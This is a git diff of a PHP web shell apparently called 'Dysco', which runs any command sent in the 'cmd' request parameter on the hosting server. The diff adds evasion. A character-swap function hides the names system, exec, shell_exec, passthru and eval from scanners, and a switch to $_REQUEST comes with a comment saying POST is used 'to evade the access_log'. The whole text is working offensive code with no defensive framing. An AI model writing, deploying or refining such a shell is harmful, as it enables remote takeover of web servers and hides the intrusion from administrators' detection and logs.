@@ -6,12 +6,22 @@
  * Contact: petruknisme@pm.me
  */
 
+function r($source)
+{
+    // replacement
+    return strtr($source, "aeuo", "ouea");
+}
+
+function enabled()
+{
+    $list_function = array(r("systum"), r("uxuc"), r("shull_uxuc"), r("possthre"), r("uvol"));
+    return array_filter($list_function, r("fenctian_uxists"));
+}
 
 function Dysco($command)
 {
-    $list_function_shell = array("system", "exec", "shell_exec", "passthru", "eval");
-    $f_enabled = array_filter($list_function_shell, 'function_exists');
-    
+    $f_enabled = enabled();
+
     echo "Enabled Function:\n<br/>";
     foreach($f_enabled as $f)
     {
@@ -21,34 +31,32 @@ function Dysco($command)
     if($f_enabled !== ""){
         $f = $f_enabled[0];
         echo "<br/>\nUsing ". $f. " as shell command\n<br/>";
-         
-        if($f == "system" || $f == "passthru"){
+
+        if($f == r("systum") || $f == r("possthre")){
             // disable multiple output for system
             ob_start();
             $output =  $f($command, $status);
-            ob_clean(); 
+            ob_clean();
         }
-        else if($f == "exec"){
+        else if($f == r("uxuc")){
             $f($command, $output, $status);
             $output = implode("n", $output);
         }
-        else if($f == "shell_exec"){
+        else if($f == r("shull_uxuc")){
             $output = $f($command);
         }
         else{
             $output = "Command execution not possible. All supported function is disabled.";
             $status = 1;
         }
- 
     }
-	
     return array('output' => $output , 'status' => $status);
 }
 
-// for HTTP GET use this.
-
-if(isset($_GET['cmd'])){
-    $o = Dysco($_GET['cmd']);
+// using REQUEST to handle GET & POST method.
+// use POST to evade the access_log
+if(isset($_REQUEST['cmd'])){
+    $o = Dysco($_REQUEST['cmd']);
     echo $o['output'];
 }
 
